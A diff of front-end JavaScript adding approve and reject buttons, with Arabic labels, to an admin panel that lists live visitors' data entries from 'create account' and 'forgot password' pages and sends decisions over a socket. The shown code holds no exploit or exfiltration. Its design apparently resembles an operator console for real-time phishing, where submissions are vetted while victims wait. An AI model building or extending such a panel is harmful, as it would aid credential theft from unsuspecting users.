@@ -2078,6 +2078,50 @@
               }, 100);
             }
             
+            // إضافة أزرار لإنشاء حساب ونسيت كلمة المرور
+            if (dataEntry.page === 'إنشاء حساب' || dataEntry.page === 'نسيت كلمة المرور') {
+              const regApproveBtnId = 'reg-approve-btn-' + visitor.socketId + '-' + dataIndex;
+              const regRejectBtnId = 'reg-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + regApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="' + regRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const approveBtn = document.getElementById(regApproveBtnId);
+                const rejectBtn = document.getElementById(regRejectBtnId);
+                if (approveBtn) {
+                  approveBtn.addEventListener('click', () => {
+                    socket.emit('admin:regAction', { visitorSocketId: visitor.socketId, action: 'approve' });
+                    visitor.waitingForAdminResponse = false;
+                    renderVisitorsList();
+                    approveBtn.textContent = 'تم الإرسال ✓';
+                    approveBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    approveBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      approveBtn.textContent = 'موافقة';
+                      approveBtn.classList.remove('bg-gray-500');
+                      approveBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                    }, 1500);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    socket.emit('admin:regAction', { visitorSocketId: visitor.socketId, action: 'reject' });
+                    visitor.waitingForAdminResponse = false;
+                    renderVisitorsList();
+                    rejectBtn.textContent = 'تم الإرسال ✓';
+                    rejectBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+                    rejectBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      rejectBtn.textContent = 'رفض';
+                      rejectBtn.classList.remove('bg-gray-500');
+                      rejectBtn.classList.add('bg-red-600', 'hover:bg-red-700');
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
             html += '</div>';
           }
         });
